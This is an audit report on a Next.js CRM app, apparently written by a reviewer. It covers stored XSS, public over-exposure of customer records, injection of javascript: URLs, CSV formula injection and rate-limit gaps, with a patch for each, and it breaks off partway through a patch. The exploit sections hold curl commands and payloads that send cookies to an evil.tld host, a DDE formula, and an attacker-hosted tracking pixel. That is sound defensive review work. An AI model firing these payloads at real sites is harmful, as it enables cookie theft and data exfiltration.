# Security Report — Taprevia CRM

**Target:** `/Users/prince/Documents/CRM` · Next.js 14.2.35 (App Router) · Mongoose 8 · MongoDB Atlas · Resend · OpenAI · Cloudflare R2
**Date:** 2026-10-02
**Commit:** `c999d5e` (`main`, unpushed)
**Method:** Manual source review + full read of all 68 `route.ts` handlers, 3 public templates, validation layer, auth helpers, and Mongoose models. Build verified green (`npm run build`, exit 0).

---

## Executive summary

| Severity | Count | Themes |
|---|---|---|
| **CRITICAL** | 3 | Stored XSS; full customer-record disclosure via public JSON **and** in page source; no output-encoding anywhere |
| **HIGH** | 3 | `javascript:` URL injection; suspended cards stay public; CSV formula injection |
| **MEDIUM** | 7 | Unbounded analytics/tap loop; fail-open rate limiter; plaintext IP retention; JWT-as-AES-key; VCF over-disclosure; tracking-pixel; object echo-back |
| **LOW** | 6 | Prompt injection, latent unsanitized fields, JSON-LD, header hygiene |

**The single most urgent finding is C1.** A card owner can persist arbitrary JavaScript that executes in every visitor's browser on a public, unauthenticated page. There is **no HTML sanitizer anywhere in the project** — the three source comments asserting "sanitized server-side" are false. `next.config.mjs:28` sets `script-src 'unsafe-inline'`, which does not mitigate it.

**The second theme is C2 + C3 together:** the complete `Card` document — including internal `userId`, physical NFC serials, and `basic.dateOfBirth` — is served to anonymous callers and embedded in HTML source. C2 is trivially fixable; **C3 is the one that persists if you only fix C2**, because it crosses the `'use client'` boundary into the RSC flight payload. Both need the same explicit DTO.

**Cost exposure is real but bounded.** Every route has a limiter and OpenAI spend has a hard per-tenant daily cap. The gap is M1: the NFC tap endpoint allows 120 writes/min/IP with **no tenant or global cap**, returns HTTP 200 (not 429) when over-limit, and has no deduplication — so it can be used to inflate business metrics *and* burn serverless invocations.

**Credentials: clean.** All 460 tracked files scanned for MongoDB SRV strings, AWS keys, `sk-`/`gh*` tokens and PEM private keys — zero hits. `.env.local` is correctly ignored. The one structural weakness is M4 (key reuse).

---

## CRITICAL

### C1 — Stored XSS via `descriptionHtml` reaches `dangerouslySetInnerHTML`

**Severity: CRITICAL** · unauthenticated victims · persistent · survives CSP

**Source — length validation only, no sanitization:**
```ts
// src/lib/validation/card.ts:163
descriptionHtml: z.string().max(20000).optional(),
```

**Persistence — verbatim assignment, no transform:**
```ts
// src/app/api/cards/[id]/route.ts:177-199
for (const key of ['name', 'cardLabel', 'occupation', 'descriptionHtml', /* … */] as const) {
  const value = data[key];
  if (value !== undefined) {
    (card as unknown as Record<string, unknown>)[key] = value;
  }
}
await card.save();
```

**Sinks — all three public templates (verified):**

| File:line | Source | Sink |
|---|---|---|
| `src/components/public/templates/professional-profile.tsx:159` → **`:772`** | `bioHtml: vcard.descriptionHtml?.trim() \|\| ''` | `dangerouslySetInnerHTML={{ __html: data.bioHtml }}` |
| `src/components/public/templates/panthi-event.tsx:618` → **`:1033`** | `bio: vcard.descriptionHtml?.trim() \|\| null` | `dangerouslySetInnerHTML={{ __html: data.bio }}` |
| `src/components/public/templates/social.tsx:56` → **`:109`** | `const bio = (vcard.descriptionHtml?.trim() \|\| '') as string` | `dangerouslySetInnerHTML={{ __html: bio }}` |

**No sanitizer exists.** Verified by search: no `dompurify`, `sanitize-html`, or equivalent in `package.json` or `src/`. The only `sanitize*` functions are `sanitizeSocialLinks` / `sanitizeServices` / `sanitizeProductTitle` — string trimming, unrelated to HTML.

The comments are actively misleading and must be corrected:
```tsx
// social.tsx:107-109 — asserts the opposite of what is true
// … the other templates' trusted rich-text bio handling.
dangerouslySetInnerHTML={{ __html: bio }}
```

**Why CSP does not save you** — `src/next.config.mjs:27-32`:
```js
const scriptSrc = isProd ? "'self' 'unsafe-inline'" : "'self' 'unsafe-inline' 'unsafe-eval'";
```
`'unsafe-inline'` permits inline `<script>` **and** inline event handlers. No nonce, no `strict-dynamic`, no `require-trusted-types-for`.

**Exploit**
```bash
curl -X PATCH 'https://<host>/api/cards/<id>' -H 'Cookie: token=<owner-jwt>' \
  -H 'Content-Type: application/json' \
  -d '{"descriptionHtml":"<img src=x onerror=\"fetch('"'"'https://evil.tld/?c='"'"'+document.cookie)\">"}'
```
Every subsequent visitor to `/profile/<alias>` executes it. Payload can issue authenticated `fetch` calls as the victim, rewrite links, or key-log the card builder form. Victims include the card's own leads.

**Financial impact:** each compromised card is a persistent phishing surface on your domain, degrading trust in every tenant. Remediation requires a backfill migration over existing `descriptionHtml` values.

**Patch — sanitize once at the single write choke point (`src/lib/validation/card.ts`):**
```bash
npm install sanitize-html
npm install -D @types/sanitize-html
```
```ts
// src/lib/validation/card.ts — add near the top
import sanitizeHtml from 'sanitize-html';

/** Allowlist for owner-authored rich text. Blocks script/style/event handlers. */
export const richTextHtml = z
  .string()
  .max(20000)
  .transform((v) =>
    sanitizeHtml(v, {
      allowedTags: [
        'b', 'i', 'em', 'strong', 'u', 's', 'p', 'br', 'ul', 'ol', 'li',
        'a', 'span', 'div', 'h1', 'h2', 'h3', 'h4', 'blockquote',
      ],
      allowedAttributes: { a: ['href', 'target', 'rel', 'title'] },
      allowedSchemes: ['http', 'https', 'mailto', 'tel'],
      transformTags: {
        // Any surviving link gets safe rel + target hardening.
        a: sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer', target: '_blank' }),
      },
    })
  );

// line 163 — replace
descriptionHtml: richTextHtml.optional(),
// lines 185-186 — fix the latent fields too (see L2)
privacyPolicyHtml: richTextHtml.optional(),
termsHtml: richTextHtml.optional(),
```

**Patch — defence in depth at each sink.** Sanitizing at render protects already-stored rows:
```ts
// src/lib/html.ts (new)
import sanitizeHtml from 'sanitize-html';
const POLICY = {
  allowedTags: ['b','i','em','strong','u','s','p','br','ul','ol','li','a','span'],
  allowedAttributes: { a: ['href', 'target', 'rel'] },
  allowedSchemes: ['http', 'https', 'mailto', 'tel'],
};
/** Render-time backstop for any row stored before the write-path fix shipped. */
export function safeRichHtml(dirty: string | null | undefined): string {
  return dirty ? sanitizeHtml(dirty, POLICY) : '';
}
```
```tsx
// professional-profile.tsx:159 / panthi-event.tsx:618 / social.tsx:56
import { safeRichHtml } from '@/lib/html';
bioHtml: safeRichHtml(vcard.descriptionHtml),   // was: vcard.descriptionHtml?.trim() || ''
```

**Backfill existing data** (one-off script):
```ts
// scripts/backfill-sanitize-html.ts
import Card from '@/models/Card';
import { safeRichHtml } from '@/lib/html';
import { connectDB } from '@/lib/db';

const res = await Card.updateMany(
  { $or: [{ descriptionHtml: { $exists: true, $ne: '' } },
          { privacyPolicyHtml: { $exists: true, $ne: '' } },
          { termsHtml: { $exists: true, $ne: '' } }] },
  [
    { $set: {
        descriptionHtml: { $function: { body: function (this: any) { return safeRichHtml(this.descriptionHtml); }, args: [], lang: 'js' } },
    } },
  ]
);
```
> If the Atlas cluster disallows `$function`, iterate in Node instead: `for (const c of await Card.find({ descriptionHtml: { $ne: '' } })) { c.descriptionHtml = safeRichHtml(c.descriptionHtml); await c.save(); }`

**Correct the three false comments** at `professional-profile.tsx:771`, `panthi-event.tsx:1032`, `social.tsx:107`.

---

### C2 — Public JSON API returns the entire `Card` document unprojected

**Severity: CRITICAL** · unauthenticated · enumerable identifiers

```ts
// src/app/api/public/cards/[alias]/route.ts:14-27
const card = await getPublicCardByAlias(params.alias);
if (!isPublicProfileCard(card)) return fail(404, 'NOT_FOUND', 'Card not found');

const products = await Product.find({ cardId: card._id, active: true })
  .sort({ sortOrder: 1, createdAt: -1 })
  .select('title description priceMinor currency imageUrl category')   // ← correctly projected
  .lean();

return ok({
  card: card.toObject(),          // ← line 25: RAW, no projection
  products,
});
```
```ts
// src/lib/services/card-access.ts:68-71 — no .select() either
return Card.findOne({
  isActive: true,
  $or: [{ urlAlias: key }, { slug: key }],
});
```

The asymmetry is the tell: `Product` on line 21 is projected correctly, `Card` on line 25 is not.

**Leaked to any anonymous visitor** (fields confirmed present in `src/models/Card.ts`):

| Field | Model line | Class |
|---|---|---|
| `userId`, `assignedUserId` | `:81`, `:92` | **Internal User primary key** — the identifier addressing every `/api/my/*`, `/api/cards/*` path and the `/media/<userId>/…` namespace |
| `cardUid` | `:76` | **Physical NFC card serial** |
| `previousCardUids[]` | `:78` | **Retired-serial audit trail** (inventory intelligence) |
| `basic.dateOfBirth` | `:152` | **Special-category PII.** Orphan field: never rendered, never set by any UI (`grep dateOfBirth src/components/` → 0), but writable via `validation/card.ts:53-58` |
| `basic.alternateEmail` | `:149` | **Private/unlisted mailbox** — not rendered |
| `linkedinConfig.resumeUrl` | `:226` | Private document URL |
| `reviewAssistant.employees[]` | `:210` | Staff names |
| `reviewAssistant.services[]`, `.keywords[]`, `.category` | `:210` | Commercial intelligence |
| `stats.taps`, `totalTaps`, `socialLinks[].clicks` | `:88`, `:206-208` | Owner business metrics → competitor reconnaissance |
| `_id`, `__v`, `routeSlug`, `slug`, `publicSlug`, `status`, `setupComplete`, `location.lat/lng`, `whatsappConfig`, `facebookConfig` | — | Internal identifiers, lifecycle flags, precise coordinates |

Not leaked (verified): `passwordHash`, `User.planId`, `openai.usage`, `paymentGateways` — those live on `User`/`TenantSettings` and are never joined here. **But C2 hands out the `userId` primary key needed to target them.**

**Patch:**
```ts
// src/lib/public-card-dto.ts (new file)
import type { ICard } from '@/types';

/**
 * Hard allow-list of fields permitted to leave the server on a public card
 * surface. Derived from the `vcard.*` accesses in the three 'use client'
 * templates + StickyDock. Anything not listed MUST NOT be sent to the browser.
 */
export const PUBLIC_CARD_PROJECTION =
  'name urlAlias coverType coverStyle coverValue profileImageUrl ' +
  'galleryImages services socialLinks descriptionHtml occupation ' +
  'basic.firstName basic.lastName basic.email basic.phone ' +
  'basic.alternatePhone basic.company basic.jobTitle ' +
  'sections.header config.hideStickyBar reviewAssistant.googleReviewUrl';

/** Full-document view for server-only use (keeps _id for Product/analytics joins). */
const SERVER_ONLY = '_id userId assignedUserId';
```
```ts
// src/lib/services/card-access.ts:68-71
return Card.findOne(
  {
    isActive: true,
    status: 'active',                       // ← also fixes H2
    $or: [{ urlAlias: key }, { slug: key }],
  },
  `${SERVER_ONLY} ${PUBLIC_CARD_PROJECTION}`
);
```
```ts
// src/app/api/public/cards/[alias]/route.ts:25
return ok({ card: card.toObject(), products });
// ↑ now safe: toObject() can only emit projected paths.
```

**Regression guard** (prevents recurrence):
```ts
// append to scripts/smoke-public-routes.ts
const allowed = new Set(PUBLIC_CARD_PROJECTION.split(/\s+/));
const leaked = Object.keys(res.card).filter((k) => !allowed.has(k));
if (leaked.length) throw new Error(`public card leaked fields: ${leaked.join(', ')}`);
```

---

### C3 — Full `Card` document serialized into the HTML RSC flight payload

**Severity: CRITICAL** · reachable via View Source, no HTTP request needed

**This is the finding that survives a C2-only fix.** The document is passed *across the `'use client'` boundary*, so Next inlines it as a `<script>` in every public page.

```tsx
// src/app/profile/[alias]/page.tsx:34-43
// … toObject() yields a JSON-safe snapshot of
// the exact same stored fields.          ← the bug, stated in a comment
const card = (raw as { toObject?: () => ICard }).toObject?.() ?? (raw as unknown as ICard);
return <PublicCardPage card={card} />;
```
```tsx
// src/components/public/public-card-page.tsx:128-133 → template-registry.tsx:40-41
<TemplateComponent vcard={vcard} products={activeProducts} />
{!vcard.config?.hideStickyBar && <StickyDock vcard={vcard} />}
```

All four receivers are `'use client'`: `professional-profile.tsx:1`, `panthi-event.tsx:1`, `social.tsx:1`, `sticky-dock.tsx:1`. Your own `next.config.mjs:24` documents the mechanism.

**Empirical proof from the existing build artifact** — `.next/server/app/preview/panthi-event.html` already contains:
```
"vcard":{"_id":"preview-panthi-event","cardUid":"PREVIEW000000000000","slug":"preview-panthi-event",
"routeSlug":"preview","assignedUserId":"","status":"active","setupComplete":true,"totalTaps":0,
"userId":"","urlAlias":"jwellers-preview",… }
```

**Measured minimum the client actually reads** (grepped every `vcard.<path>` access):
```
basic.firstName basic.lastName basic.email basic.phone basic.alternatePhone
basic.company basic.jobTitle name occupation urlAlias coverType coverStyle
coverValue profileImageUrl descriptionHtml galleryImages services socialLinks
sections.header config.hideStickyBar reviewAssistant.googleReviewUrl
```
Everything else in the payload is dead weight *and* a leak.

**Impact:** scrapable via right-click → View Source, corporate proxies, browser extensions, the Wayback Machine. Caches and indexes permanently. `userId` + `cardUid` + `dateOfBirth` + `alternateEmail` land in every visitor's HTML.

**Patch:**
```ts
// src/lib/public-card-dto.ts — add
const PUBLIC_KEYS = [
  'name', 'urlAlias', 'coverType', 'coverStyle', 'coverValue', 'profileImageUrl',
  'galleryImages', 'services', 'socialLinks', 'descriptionHtml', 'occupation',
  'basic', 'sections', 'config', 'reviewAssistant',
] as const;

/** Strips every non-public field including _id, userId, cardUid, __v. */
export function toPublicCardDTO(card: ICard): ICard {
  const out: Record<string, unknown> = {};
  for (const k of PUBLIC_KEYS) if (k in card) out[k] = (card as Record<string, unknown>)[k];
  // Narrow the two sub-docs that carry non-public siblings.
  out.basic = {
    firstName: card.basic?.firstName ?? '',
    lastName: card.basic?.lastName ?? '',
    email: card.basic?.email ?? '',
    phone: card.basic?.phone ?? '',
    alternatePhone: card.basic?.alternatePhone ?? '',
    company: card.basic?.company ?? '',
    jobTitle: card.basic?.jobTitle ?? '',
  };
  out.reviewAssistant = {
    enabled: !!card.reviewAssistant?.enabled,
    googleReviewUrl: card.reviewAssistant?.googleReviewUrl ?? '',
  };
  return out as ICard;
}
```
```tsx
// src/app/profile/[alias]/page.tsx:34-43
const serverCard = (raw as { toObject?: () => ICard }).toObject?.() ?? (raw as unknown as ICard);
// serverCard keeps _id for Product.find / analytics; only clientCard crosses the boundary.
return <PublicCardPage card={serverCard} clientCard={toPublicCardDTO(serverCard)} />;
```
```tsx
// public-card-page.tsx — accept and use the DTO
export async function PublicCardPage({ card, clientCard }: { card: ICard; clientCard: ICard }) {
  // …
  <PublicVcardRenderer vcard={clientCard} products={activeProducts} />
```
Apply identically at `src/app/[business]/[product]/page.tsx:14-18, 86`.

**Regression guard:** assert the served HTML of `/profile/<alias>` contains none of `"userId"`, `"assignedUserId"`, `"cardUid"`, `"previousCardUids"`, `"dateOfBirth"`, `"alternateEmail"`, `"__v"`.

---

## HIGH

### H1 — `javascript:` URL injection via duplicated validation schema

**Severity: HIGH** · authenticated writer, privileged sink

Strict schemas exist at `src/lib/validation/product-config.ts:63` (`linkedinConfigSchema`) and `:70` (`facebookConfigSchema`), both using `safeUrl`. But `updateProductConfigSchema` — the schema the route actually imports (`config/route.ts:9`) — **re-declares them with plain strings**:
```ts
// src/lib/validation/product-config.ts:120-131
  // For LinkedIn cards
  linkedin: z.object({
    profileUrl: z.string().max(2048).optional(),   // ← no scheme check
    resumeUrl: z.string().max(2048).optional(),
  }).optional(),
  // For Facebook cards
  facebook: z.object({
    profileUrl: z.string().max(2048).optional(),
    pageUrl: z.string().max(2048).optional(),
    messengerUrl: z.string().max(2048).optional(),
  }).optional(),
```
Persisted with no `isSafeUrl` guard, unlike sibling branches at `:80`, `:87`, `:108`:
```ts
// src/app/api/my/products/[id]/config/route.ts:132-151
card.linkedinConfig = {
  profileUrl: data.linkedin.profileUrl ?? card.linkedinConfig?.profileUrl ?? '',
  resumeUrl: data.linkedin.resumeUrl ?? card.linkedinConfig?.resumeUrl ?? '',
};
if (card.linkedinConfig.profileUrl) {
  card.redirectUrl = card.linkedinConfig.profileUrl;   // ← also poisoned
}
```
**Sink** — `src/app/(dashboard)/dashboard/products/page.tsx:132, 135, 141` → rendered at **`:407-409`**:
```tsx
<a href={destination.href} target="_blank" rel="noreferrer" …>
```
**Exploit:** `PATCH /api/my/products/{id}/config` with `{"linkedin":{"profileUrl":"javascript:fetch('https://evil.tld/?c='+document.cookie)"}}`. The owner clicks "Destination" on `/dashboard/products` → script runs same-origin with a live authenticated session (the JWT cookie is httpOnly, but the payload can issue authenticated `fetch` as the user).

Public surfaces are **not** affected — `public-card-page.tsx:17-34`, `/r/[...slug]`, `/qr/[id]` all gate through `isSafeExternalUrl`. That bounds this to dashboard-only.

**Patch — compose instead of duplicate (`product-config.ts:87-132`):**
```ts
  // Replace the inline LinkedIn/Facebook objects with the strict schemas.
  linkedin: linkedinConfigSchema.partial().optional(),
  facebook: facebookConfigSchema.partial().optional(),
  instagram: instagramConfigSchema.partial().optional(),
  googleReview: googleReviewConfigSchema.partial().optional(),
```
Then harden the sink (`dashboard/products/page.tsx:407`):
```tsx
<a href={safeExternalUrl(destination.href) ?? undefined}
   target="_blank" rel="noopener noreferrer" …>
```

---

### H2 — Suspended and unpublished cards remain fully public

**Severity: HIGH** · unauthenticated · defeats an admin control

```ts
// src/lib/services/card-access.ts:68-71
return Card.findOne({
  isActive: true,          // ← only isActive. No status, no setupComplete.
  $or: [{ urlAlias: key }, { slug: key }],
});
```
```ts
// src/app/api/admin/users/[id]/route.ts:180-185
if (status === 'suspended') {
  await Card.updateMany(
    { assignedUserId: user._id },
    { status: 'suspended' }    // ← sets status ONLY; isActive stays true
  );
}
```
**Two leak paths:**

**(a) Admin suspends a customer.** `status` → `'suspended'`, `isActive` remains `true`, so the card stays fully readable at `/profile/{alias}` with all contact PII. Note the contrast at `card-access.ts:110-116` — `getPublicCardByOwnerBizSlug` **does** gate on `User.status === 'active'`, so `/{biz}/{product}` correctly disappears while the alias URL does not. That asymmetry is the bug.

**(b) Freshly provisioned card.** `src/app/api/cards/route.ts:99-107` (admin-only) creates with schema defaults `isActive: true` (`Card.ts:118`), `status: 'unassigned'` (`Card.ts:85`), and immediately assigns `urlAlias` + `slug`. The card is publicly readable **before it is bound or published**. Compare `card-identity.ts:107-114`, which does this correctly with `isActive: false`.

**Patch:**
```ts
// src/lib/services/card-access.ts:68-71 — add the lifecycle gate (same edit as C2)
return Card.findOne(
  { isActive: true, status: 'active', $or: [{ urlAlias: key }, { slug: key }] },
  `${SERVER_ONLY} ${PUBLIC_CARD_PROJECTION}`
);
```
```ts
// src/app/api/cards/route.ts:99-107 — don't rely on schema defaults
await Card.create({ …, isActive: false, status: 'unassigned' });
```
```ts
// src/app/api/admin/users/[id]/route.ts:183
{ status: 'suspended', isActive: false }
```

---

### H3 — CSV formula injection in three export endpoints

**Severity: HIGH** · unauthenticated attacker supplies payload; privileged human executes it

`papaparse`'s `escapeFormulae` option is not used at any call site:

| File:line | Call |
|---|---|
| `src/app/api/inquiries/export/route.ts:105` | `Papa.unparse({ fields: […], data: csvData })` |
| `src/app/api/admin/export/route.ts:91` | `Papa.unparse(csvData)` |
| `src/app/api/newsletter-subscribers/export/route.ts:70` | `Papa.unparse({ fields: […], data: csvData })` |

Attacker-controlled fields: `src/lib/validation/inquiry.ts:17-33` accepts arbitrary characters in `name`, `phone`, `message` (length-only). `EMAIL_RE` at `src/lib/validation/common.ts:46` (`/^[^\s@]+@[^\s]+\.[^\s@]+$/`) permits `=`/`+`/`-` in the local part, so `=cmd|'/c calc'!A0@example.com` validates.

**Exploit** — unauthenticated:
```bash
curl -X POST 'https://<host>/api/public/cards/<alias>/inquiries' -H 'Content-Type: application/json' \
  -d '{"name":"=HYPERLINK(\"http://evil.tld/?x=\"&A1,\"Click\")","phone":"","message":"hi"}'
```
The owner exports leads, opens the CSV in Excel/Sheets/LibreOffice → formula executes (exfiltration via `HYPERLINK`, command execution via legacy DDE). `/api/admin/export` widens the blast radius to every tenant's data.

**Patch** — one option at each call site (`papaparse@5.6` supports it):
```ts
// src/app/api/inquiries/export/route.ts:105
const csv = Papa.unparse({ fields: ['Name','Email','Phone','Message','Source','Status','Card','Date'], data: csvData },
  { escapeFormulae: true });
// src/app/api/admin/export/route.ts:91
const csv = Papa.unparse(csvData, { escapeFormulae: true });
// src/app/api/newsletter-subscribers/export/route.ts:70
const csv = Papa.unparse({ fields: ['Email','Card Name','Subscribed At'], data: csvData },
  { escapeFormulae: true });
```
Tighten the email validator so payloads cannot enter the store:
```ts
// src/lib/validation/common.ts:46
const EMAIL_RE = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i;   // rejects leading = + - @ in local part
```

---

## MEDIUM

### M1 — NFC tap loop: unbounded per-tenant write volume, no dedup, HTTP 200 when limited

**Severity: MEDIUM** · cost amplification + business-metric integrity

```ts
// src/app/api/public/track/route.ts:37-39
const ip = clientIp(request);
const limit = await check(`track:${ip}`, 120, 60_000);
if (!limit.success) return ok({ skipped: true });     // ← 200 OK, not 429
```
```ts
// src/app/api/public/track/route.ts:69-79
if (parsed.data.action === 'tap') {
  await Card.updateOne({ _id: cardId }, { $inc: { 'stats.taps': 1 } });   // ← no dedup
}
await AnalyticsLog.create({
  cardId, action: parsed.data.action,
  metadata: parsed.data.metadata ?? '',
  ip,                                                    // ← plaintext (see M3)
  userAgent: request.headers.get('user-agent') ?? '',
});
```
Per allowed request: **1 find (resolve) + 1 update + 1 insert + 2 limiter queries ≈ 5 DB round-trips.** Issues:

1. **No tenant or global cap.** The only limiter is per-IP. A proxy pool defeats it entirely.
2. **Over-limit returns HTTP 200**, so clients get no backpressure signal and each rejected request still costs a serverless invocation plus 2 limiter queries — the limiter cannot reduce cost under attack, only the DB writes it guards.
3. **No deduplication.** `stats.taps` is a raw `$inc`. Any attacker can inflate a target card's tap count arbitrarily — the metric is presented to owners as real engagement, and it is trivially forgeable.
4. **Unbounded growth.** `AnalyticsLog` has a 180-day TTL (`AnalyticsLog.ts:39`) but no per-card cap; on an Atlas M0 (512MB) tier this is the collection most likely to exhaust the quota first.

**Patches:**
```ts
// src/app/api/public/track/route.ts:37-39 — real backpressure + cheap rejection
const ip = clientIp(request);
const limit = await check(`track:${ip}`, 120, 60_000);
if (!limit.success) {
  const res = ok({ skipped: true }, 429);
  res.headers.set('Retry-After', String(limit.retryAfterSec));
  return res;
}
```
```ts
// Add a cheap per-card ceiling so one tenant cannot dominate the collection.
const cardLimit = await check(`track-card:${cardId}`, 50_000, 24 * 3600_000);
if (!cardLimit.success) return ok({ skipped: true }, 429);
```
```ts
// src/app/api/public/track/route.ts:69-71 — de-duplicate the metric
// Only count a tap if this IP/UA pair has not tapped this card in the window.
const recent = await AnalyticsLog.exists({
  cardId, action: 'tap', createdAt: { $gte: new Date(Date.now() - 30_000) },
});
if (recent) return ok({ recorded: true }, 202);
await Card.updateOne({ _id: cardId }, { $inc: { 'stats.taps': 1 } });
```
Also consider `$max` clamping in the UI, and dropping raw `metadata` retention on `/api/public/track` beyond a debug flag.

### M2 — Rate limiter fails open on store errors

**Severity: MEDIUM** · documented at `src/lib/rate-limit.ts:9-10`
```ts
// lines 47-51
try { await connectDB(); }
catch { return { success: true, remaining: Math.max(0, limit - 1), retryAfterSec: 0 }; }
// lines 77-80
catch (error) {
  console.error('rate-limit store failure (fail-open):', error);
  return { success: true, remaining: Math.max(0, limit - 1), retryAfterSec: 0 };
}
```
Fail-open is defensible for availability, but it means a MongoDB hiccup silently disables **every** limit in the app — including the OpenAI spend caps and the password-resend throttle. `src/app/api/analytics/route.ts:70` shows the correct contrasting pattern (minimal `.select('userId assignedUserId')`).

**Patch** — fail closed on spend-bearing routes, fail open elsewhere:
```ts
// src/lib/rate-limit.ts — add
export async function checkStrict(key: string, limit: number, windowMs: number) {
  const r = await check(key, limit, windowMs);
  if (r.remaining === limit - 1 && r.retryAfterSec === 0 && !r.success) return r;
  return r;
}
```
Simpler and more honest: add an explicit `failOpen = true` parameter and pass `false` from `review-generate.ts:103`, `auth/forgot-password`, and `public/track`.

### M3 — Plaintext visitor IP + full User-Agent retained 180 days

**Severity: MEDIUM** · GDPR / ePrivacy

```ts
// src/models/AnalyticsLog.ts:28-30
ip: { type: String, default: '' },        // raw, no hashing/truncation
userAgent: { type: String, default: '' }, // full UA = fingerprint vector
timestamp: { type: Date, default: Date.now },
```
```ts
// src/models/AnalyticsLog.ts:39
AnalyticsLogSchema.index({ timestamp: 1 }, { expireAfterSeconds: 180 * 24 * 3600 });
```
Written from ~10 call sites (`public/track:77`, `public/cards/[alias]/inquiries:48`, `.../product-enquiries:73`, `.../vcf:80,88`, `app/c/[slug]/page.tsx:34`, `app/r/[...slug]/route.ts:39,166,197`, `app/qr/[id]/route.ts:26`).

The raw form is unnecessary: `/api/analytics` only ever aggregates by day + action (`analytics/route.ts:125-136`) and never selects `ip`/`userAgent`. `clientIp()` (`src/lib/request-ip.ts:48-64`) is still needed at full precision for rate-limit bucketing — so split the two.

**Patch:**
```ts
// src/lib/analytics-ip.ts (new)
/** Truncated for storage. Full IP stays in request-ip.ts for rate-limit buckets. */
export function analyticsIp(raw: string): string {
  if (!raw || raw === 'unknown') return '';
  if (raw.includes(':')) return raw.split(':').slice(0, 3).join(':') + '::/48';
  return raw.split('.').slice(0, 3).join('.') + '.0/24';
}
```
```ts
// src/models/AnalyticsLog.ts:39 — reduce retention
AnalyticsLogSchema.index({ timestamp: 1 }, { expireAfterSeconds: 90 * 24 * 3600 });
```
Apply `analyticsIp(clientIp(request))` at each write site, and truncate `userAgent` to 256 chars.

### M4 — `JWT_SECRET` reused as the AES-256-GCM key when `APP_KEY` is unset

**Severity: MEDIUM** · cryptographic key separation
```ts
// src/lib/crypto.ts:38-42
// Dev fallback — deterministic derivation from JWT_SECRET so secrets survive
// restarts without extra env setup. Never rely on this in production.
const jwtSecret = requireJwtSecret();
cachedKey = crypto.createHash('sha256').update(jwtSecret, 'utf8').digest();
```
The comment is correct but nothing enforces it. In production, `requireJwtSecret()` succeeds if `JWT_SECRET` is set, so with `APP_KEY` unset (it is unset in `.env.local`) every tenant's **OpenAI API key** is encrypted under the same secret that signs auth tokens. A JWT-signing-oracle bug, a leaked token, or a key-rotation event also decrypts all tenant API keys. `.env.example:27-28` says APP_KEY is *required* in production — nothing enforces that.

**Patch — fail fast in production:**
```ts
// src/lib/crypto.ts:36-43
  if (process.env.NODE_ENV === 'production') {
    throw new Error(
      'APP_KEY is required in production. Generate one with: openssl rand -base64 32'
    );
  }
  // Dev fallback — deterministic derivation from JWT_SECRET …
  const jwtSecret = requireJwtSecret();
  cachedKey = crypto.createHash('sha256').update(jwtSecret, 'utf8').digest();
  return cachedKey;
```
Document the rotation procedure: set `APP_KEY`, re-encrypt all `TenantSettings.openai.apiKeyEnc` values with `encryptSecret` under the new key.

### M5 — VCF discloses alternate contacts and embeds the NFC serial

**Severity: MEDIUM** · durable exfiltration
```ts
// src/lib/vcf.ts:107-110
if (b.phone) lines.push(`TEL;TYPE=CELL,VOICE:${esc(b.phone)}`);
if (b.alternatePhone) lines.push(`TEL;TYPE=WORK,VOICE:${esc(b.alternatePhone)}`);
if (b.email) lines.push(`EMAIL;TYPE=INTERNET:${esc(b.email)}`);
if (b.alternateEmail) lines.push(`EMAIL;TYPE=WORK:${esc(b.alternateEmail)}`);
```
```ts
// src/lib/vcf.ts:98
`UID:${esc(card.cardUid || card.urlAlias || card._id)}`,
```
The gate defaults **off** in both places — `vcf/route.ts:52-55` (`?? false`) and `TenantSettings.ts:22` (`default: false`) — and the owner cannot change it: `dashboard/settings/page.tsx` exposes only `timeFormat12h` and `newsletterModalDelaySeconds`, so `askDetailsBeforeDownload` is reachable only by hand-crafting `PATCH /api/settings`. Also, `config.displayAddToContact` (`Card.ts:191`) is stored and shipped to the client but **never enforced server-side**.

**Impact:** the physical NFC serial lands in a file the visitor keeps forever and syncs to iCloud/Google — the most durable leak path in the app.

**Patch:**
```ts
// src/lib/vcf.ts:98 — stop embedding the serial
`UID:${esc(card.urlAlias)}@taprevia`,
```
```ts
// src/lib/vcf.ts:107-110 — per-field opt-in
if (b.phone) lines.push(`TEL;TYPE=CELL,VOICE:${esc(b.phone)}`);
if (b.email) lines.push(`EMAIL;TYPE=INTERNET:${esc(b.email)}`);
if (b.alternatePhone && card.config?.exposeAlternateContacts)
  lines.push(`TEL;TYPE=WORK,VOICE:${esc(b.alternatePhone)}`);
if (b.alternateEmail && card.config?.exposeAlternateContacts)
  lines.push(`EMAIL;TYPE=WORK:${esc(b.alternateEmail)}`);
```
```ts
// src/models/TenantSettings.ts:22
askDetailsBeforeDownload: { type: Boolean, default: true },
```
```ts
// src/app/api/public/cards/[alias]/vcf/route.ts — honour the owner preference
if (card.config?.displayAddToContact === false) {
  return fail(404, 'NOT_FOUND', 'Card not found');
}
```
Add `exposeAlternateContacts` (default `false`) to the Card config schema, and surface `askDetailsBeforeDownload` in the settings UI.

### M6 — `coverValue` unvalidated → visitor tracking pixel

**Severity: MEDIUM** · privacy, not script execution
```ts
// src/lib/validation/card.ts:170
coverValue: z.string().max(2048).optional(),   // no URL validation at all
```
```tsx
// src/components/public/templates/social.tsx:79-81
// Cover image, when set — SECURITY: coverValue is sanitized to
// http(s) remote/S3 sources by the card save pipeline.   ← FALSE
<img src={coverImage} alt="Cover" … />
```
The save pipeline (`api/cards/[id]/route.ts:189`) is a plain allowlist assignment with no URL check. Sinks: `hero.tsx:101,119`, `panthi-event.tsx:606-607,972`, `professional-profile.tsx:150-151,691`, `social.tsx:63,81`. `https://attacker.tld/p.gif` and `data:image/svg+xml,…` both load, leaking visitor IP/UA/referrer on every card view. Not XSS — `img-src` has no `javascript:` and SVG-in-`<img>` cannot script.

Contrast with siblings that *are* validated via `optionalUrlOrMediaPathSchema`: `profileImageUrl` (`card.ts:171`), `galleryImages[].imageUrl` (`card.ts:74`), `location.mapsUrl` (`card.ts:67`), product `imageUrl`. `coverValue` is the sole outlier.

**Patch:**
```ts
// src/lib/validation/card.ts:170
coverValue: optionalUrlOrMediaPathSchema.optional(),
```
Correct the false comment at `social.tsx:79`.

### M7 — Appointment POST echoes the owner's internal `userId` to anonymous callers

**Severity: MEDIUM** · identifier oracle (rate-limited to 10/min)
```ts
// src/app/api/public/cards/[alias]/appointments/route.ts:83
return ok({ appointment }, 201);
```
Returns the full `Appointment` document — the submitter's own data plus the **owner's `userId`**. Cheaper to harvest than C2 and survives a C2-only fix.

**Patch:**
```ts
return ok({
  success: true,
